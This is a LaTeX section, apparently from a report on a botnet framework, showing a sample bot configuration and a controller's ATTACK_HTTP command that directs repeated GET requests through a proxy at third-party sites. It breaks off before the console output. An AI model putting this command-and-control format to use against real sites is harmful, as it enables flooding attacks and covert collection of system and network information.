\section{Sample execution}
\label{sec:sample-execution}

We show here a sample execution to give the reader an idea about how everything works. We suggest the reader to refer to \cite{video-tutorial} to better undesrtand how configuration and commands could be conveniently generated.

In thi example, the bot is run in default mode with the following configuration:

\begin{verbatim}
  cnfInfo: True
  tgtInfo: True
  sysInfo: True
  netInfo: True
  controllers:
    - init: invalid/botinit.json
      command: invalid/botcmd.json
      log: invalid/botlog.json
    - init: controller/botinit.json
      command: controller/botcmd.json
      log: controller/botlog.json
  polling: 90-120:SECONDS
  reconnections: 3
  reconnectionWait: 2-5:SECONDS
  proxy: none
  userAgent: MyAwesomeBot
\end{verbatim}

Notice that the first specified controller is an invalid one - it mimics an unrecheable or compromised contoller.
The controller gives the bot the following \texttt{ATTACK-HTTP} command:

\begin{verbatim}
  {
    "command": "ATTACK_HTTP",
    "attacks": [
      {
        "method": "GET",
        "target": "http://www.twitter.com"
      },
      {
        "method": "GET",
        "target": "http://www.google.com",
        "proxy": "31.220.56.101:80",
        "properties": {
          "User-Agent": "MyAwesomeBot"
        },
        "executions": 3,
        "period": "10-15:SECONDS"
      }
    ]
  }
\end{verbatim}

followed by commands \texttt{REPORT} and \texttt{KILL}.
The following is the console output\footnote{classes and methods name indicated in \ref{sec:logging} have been omitted for better page formatting.}:
